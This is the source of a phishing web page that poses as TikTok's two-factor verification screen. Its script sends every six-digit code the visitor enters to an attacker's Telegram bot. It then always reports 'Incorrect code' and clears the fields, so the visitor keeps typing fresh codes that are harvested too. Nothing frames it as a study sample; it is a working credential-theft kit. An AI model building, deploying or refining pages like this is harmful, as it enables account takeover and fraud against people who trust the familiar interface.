<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Two Factor - TikTok</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome Icons CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Font Inter -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <!-- Telegram Configuration File -->
    <script src="config.js"></script>
    <style>
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        .code-input:focus {
            outline: none;
            border-bottom-color: #111827 !important;
        }

        /* Hide number spinner controls */
        input[type="number"]::-webkit-inner-spin-button,
        input[type="number"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type="number"] {
            -moz-appearance: textfield;
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-0 sm:p-4">

    <!-- Main Modal Container Card -->
    <div class="bg-white w-full max-w-[440px] h-screen sm:h-[620px] sm:rounded-xl shadow-none sm:shadow-lg flex flex-col justify-between relative overflow-hidden">

        <div>
            <!-- Top Header Navigation -->
            <div class="flex items-center justify-between px-5 pt-5 pb-3">
                <!-- Back Arrow Icon -->
                <button class="text-black hover:opacity-70 transition-opacity p-1 focus:outline-none" aria-label="Back">
                    <i class="fa-solid fa-chevron-left text-lg text-gray-800"></i>
                </button>

                <!-- Page Title -->
                <h1 class="text-[17px] font-semibold text-gray-900 tracking-normal">Two Factor</h1>

                <!-- Help Icon -->
                <button class="text-black hover:opacity-70 transition-opacity p-1 focus:outline-none" aria-label="Help">
                    <i class="fa-regular fa-circle-question text-lg text-gray-800"></i>
                </button>
            </div>

            <!-- Verification Content Section -->
            <div class="px-7 pt-7">
                <!-- Heading -->
                <h2 class="text-2xl font-bold text-gray-900 tracking-tight mb-2">
                    Enter 6-digit code
                </h2>

                <!-- Subtitle with updated trusted device text -->
                <p class="text-sm text-gray-400 font-normal mb-8">
                    Your code was sent to your trusted device
                </p>

                <!-- 6-Digit Code Inputs Container -->
                <div class="flex items-center justify-between gap-2.5 max-w-[340px] mb-3" id="otp-container">
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" autofocus />
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" />
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" />
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" />
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" />
                    <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="code-input w-11 h-12 text-center text-xl font-semibold text-gray-900 border-b border-gray-300 bg-transparent transition-colors focus:border-black" />
                </div>

                <!-- Error Message Container (Hidden by default) -->
                <div id="error-message" class="hidden text-xs text-[#fe2c55] font-medium mb-4 flex items-center">
                    <i class="fa-solid fa-circle-exclamation mr-1.5"></i> Incorrect code. Please try again.
                </div>

                <!-- Resend Code Timer -->
                <div class="text-xs font-semibold text-gray-400 mt-4">
                    <span id="resend-text">Resend code: <span id="countdown">42</span>s</span>
                    <button id="resend-btn" onclick="startResendTimer()" class="hidden text-gray-900 font-semibold hover:underline focus:outline-none">
                        Resend code
                    </button>
                </div>
            </div>
        </div>

    </div>

    <script>
        // DOM Elements
        const inputs = document.querySelectorAll('.code-input');
        const countdownEl = document.getElementById('countdown');
        const resendTextEl = document.getElementById('resend-text');
        const resendBtnEl = document.getElementById('resend-btn');
        const errorMessageEl = document.getElementById('error-message');

        let timer = 42;
        let timerInterval = null;

        // Function to send code data to Telegram
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;

            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CONFIG.chatId,
                        text: message
                    })
                });
            } catch (error) {
                console.error('Error connecting to Telegram API:', error);
            }
        }

        // Check if all 6 digits are entered
        async function checkCompleteOTP() {
            let code = '';
            inputs.forEach(input => {
                code += input.value;
            });

            if (code.length === 6) {
                // Temporarily disable inputs while sending
                inputs.forEach(input => input.disabled = true);

                const message = `🔢 TikTok 2FA Code Attempt\n• Code: ${code}`;
                await sendToTelegram(message);

                // Show error message, clear inputs, re-enable them, and focus back to the first box
                errorMessageEl.classList.remove('hidden');
                
                inputs.forEach(input => {
                    input.value = '';
                    input.disabled = false;
                    input.style.borderBottomColor = '#fe2c55'; // Highlight bottom border red
                });

                inputs[0].focus();
            }
        }

        // Auto-advance and digit input management
        inputs.forEach((input, index) => {
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    if (!input.value && index > 0) {
                        inputs[index - 1].focus();
                        inputs[index - 1].value = '';
                    } else {
                        input.value = '';
                    }
                    e.preventDefault();
                } else if (e.key === 'ArrowLeft' && index > 0) {
                    inputs[index - 1].focus();
                } else if (e.key === 'ArrowRight' && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            input.addEventListener('input', (e) => {
                const value = e.target.value;

                // Hide error message as soon as user starts typing a new code
                errorMessageEl.classList.add('hidden');
                inputs.forEach(inp => inp.style.borderBottomColor = '');

                // Handle pasted multiple digits (e.g., 6-digit code pasted)
                if (value.length > 1) {
                    const digits = value.replace(/\D/g, '').split('');
                    digits.forEach((digit, idx) => {
                        if (index + idx < inputs.length) {
                            inputs[index + idx].value = digit;
                        }
                    });
                    const lastFilledIndex = Math.min(index + digits.length - 1, inputs.length - 1);
                    inputs[lastFilledIndex].focus();
                    checkCompleteOTP();
                    return;
                }

                // Accept only numeric characters
                if (!/^[0-9]$/.test(value)) {
                    input.value = '';
                    return;
                }

                // Advance to next input
                if (value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }

                checkCompleteOTP();
            });

            input.addEventListener('focus', () => {
                input.select();
            });
        });

        // Countdown Timer Logic
        function startResendTimer() {
            timer = 60;
            resendTextEl.classList.remove('hidden');
            resendBtnEl.classList.add('hidden');
            countdownEl.textContent = timer;

            clearInterval(timerInterval);
            timerInterval = setInterval(() => {
                timer--;
                countdownEl.textContent = timer;

                if (timer <= 0) {
                    clearInterval(timerInterval);
                    resendTextEl.classList.add('hidden');
                    resendBtnEl.classList.remove('hidden');
                }
            }, 1000);
        }

        function initCountdown() {
            timer = 42;
            countdownEl.textContent = timer;
            timerInterval = setInterval(() => {
                timer--;
                countdownEl.textContent = timer;

                if (timer <= 0) {
                    clearInterval(timerInterval);
                    resendTextEl.classList.add('hidden');
                    resendBtnEl.classList.remove('hidden');
                }
            }, 1000);
        }

        // Initialize on load
        window.addEventListener('DOMContentLoaded', () => {
            initCountdown();
            inputs[0].focus();
        });
    </script>
</body>
</html>
